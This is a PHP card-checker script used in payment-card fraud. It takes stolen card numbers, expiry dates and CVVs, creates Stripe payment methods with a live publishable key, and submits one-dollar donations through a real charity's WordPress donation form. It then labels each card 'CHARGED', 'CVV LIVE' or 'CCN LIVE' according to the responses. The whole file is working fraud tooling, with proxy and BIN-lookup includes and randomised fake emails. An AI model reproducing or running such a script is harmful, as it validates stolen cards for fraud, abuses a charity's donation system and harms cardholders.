<?php 
set_time_limit(0);
error_reporting(0);

$cookie = "data/".str_shuffle("cookie_checker".rand(0,1000)). ".txt";
$card = $_GET["lista"];
$array = explode("|", $card);
$cc = $array[0];
$mes = $array[1];
$ano = $array[2];
$mes1 = str_replace(0,"",$mes);
$ano1 = str_replace(20,"",$ano);
$cvv = $array[3];


include("proxy.php");
include("bin.php");




    
$guid= vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex(random_bytes(16)), 4));

$muid = vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex(random_bytes(16)), 4));

$sid = vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex(random_bytes(16)), 4));


function value($str,$find_start,$find_end){
$start = @strpos($str,$find_start);
if ($start === false){
    return "";
}
$length = strlen($find_start);
$end    = strpos(substr($str,$start +$length),$find_end);
return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor){
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
}

function getcapture($str, $starting_word, $ending_word){
$subtring_start  = strpos($str, $starting_word);
$subtring_start += strlen($starting_word);
$size            = strpos($str, $ending_word, $subtring_start) - $subtring_start;
return substr($str, $subtring_start, $size);
};



$characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
$email = '';
$pass  = '';

$email_length = 10;

for ($i = 0; $i < $email_length; $i++) {
    $random_index = rand(0, strlen($characters) - 1);
    $email .= $characters[$random_index];
    $pass .= $characters[$random_index];
}

$email .= '%40gmail.com';
$pass .= ''; 


$cookie = 'cookies/cookie_' . uniqid() . '.txt';

//////////////[ 1 req ]////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'method: POST',
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.42',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[email]='.$email.'&billing_details[address][postal_code]=10080&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid='.$guid.'&muid='.$muid.'&sid='.$sid.'&pasted_fields=number&payment_user_agent=stripe.js%2F58a21620ba%3B+stripe-js-v3%2F58a21620ba&time_on_page=100202&key=pk_live_kXWc5SJa9yqDngQw9KddHdnO00GUGmsJyu');
$r1 = curl_exec($ch);
curl_close($ch);

preg_match_all('/"message": "(.*?)"/',$r1,$m);
$msg1 = $m[1][0];

$id = trim(strip_tags(getStr($r1,'"id": "','"'))); 


///////////////[ 2 req ]/////////////////


$ch = curl_init('https://www.youthawakening.ca/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'method: POST',
'content-type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
'Pragma: no-cache',
'Accept: */*',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=formcraft3_form_submit&field8=&field1%5B%5D='.$pass.'&field2='.$email.'&field11%5B%5D=1&website=&field12=1&stripe-coupon=&stripe_token='.$id.'&id=6&location=https%3A%2F%2Fwww.youthawakening.ca%2Fdonate%2F&emails=&hidden=&redirect=&type=all&triggerIntegration=undefined&fieldLabels=undefined&formcraft3_wpnonce=undefined');
$r2 = curl_exec($ch);
curl_close($ch);


$json = json_decode($r2,1);
$msg2 = $json["failed"];
if(isset($msg1)){
$message = $msg1;
} else if(isset($msg2)){
$message = $msg2;
}

$gate = "Stripe [1$]";
if(strpos($r2,"succeeded") or strpos($r2,"Success") or strpos($r2,"Payment successful")){
$status = "CHARGED";
$message = "#Successful: Thank you !!.";
$emoji = "✅ ";

} else if(strpos($r2,"Insufficient Funds")){
$status = "CVV LIVE";
$message = "Your card has insufficient funds.";

} else if(strpos($r2,"The zip code you supllied failed vaildation")){
$status = "CVV LIVE";
$message = "The zip code you supllied failed vaildation";

} else if(strpos($r2,"The zip or postal code for your billing address.")){
$status = "CVV LIVE";
$message = "The zip or postal code for your billing address.";

} else if(strpos($r2,"Insufficient Funds")){
$status = "CVV LIVE";
$message = "Your card has insufficient funds.";
$emoji = "✅ ";
} else if(strpos($r2,"Your card's security code is incorrect")){
$status = "CCN LIVE";
$message = "Your card's security code is incorrect";
$emoji = "✅ ";
} else {
$status = "declined";
$emoji = "❌";
}
unlink($cookie);
echo json_encode([
"status"=>true,
"card"=>$card,
"cards"=>[
"card"=>$cc,
"month"=>$mes,
"year"=>$ano,
"cvv"=>$cvv,
],
"check"=>$status,
"result"=>$message,
"gate"=>$gate,
"emoji"=>$emoji,
"proxy"=>$proxy_ip,
"status_proxy"=>$status_proxy,
"bin"=>$bin,
"bank"=>$bank,
"country"=>$country,
"flag"=>$flag,
"scheme"=>$scheme,
"type"=>$type ?? "Unknow",
"brand"=>$brand ?? "Unknow"
],64|128|256);

